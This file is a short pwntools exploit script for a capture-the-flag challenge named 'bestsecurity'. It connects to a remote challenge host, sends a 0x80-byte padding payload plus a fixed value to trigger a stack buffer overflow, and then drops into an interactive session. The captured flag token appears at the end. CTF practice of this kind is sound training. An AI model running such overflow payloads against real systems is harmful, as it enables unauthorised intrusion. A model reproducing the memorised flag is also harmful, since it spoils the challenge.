#!/usr/bin/env python2

from pwn import *

def start():
    prog  = "./bestsecurity"
    ip   = "plsdonthaq.me"
    port = 2003

    if args.REMOTE:
        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p

p = start()

payload = b"A" * 0x80
payload += b"1234"
p.sendlineafter("...\n", payload)

p.interactive()

# FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1iZXN0c2VjdXJpdHkiLCJpcCI6IjEwMS4xNjQuMzMuMjE5Iiwic2Vzc2lvbiI6ImVkMzQ3MDU5LTIzNGItNDZiYS04MmYwLTFjNTBmZjI2MzNjYiJ9.QSZg6f6cvp15nbw1S1IWuaf3ISOnQBhhMMNCwSCVQro}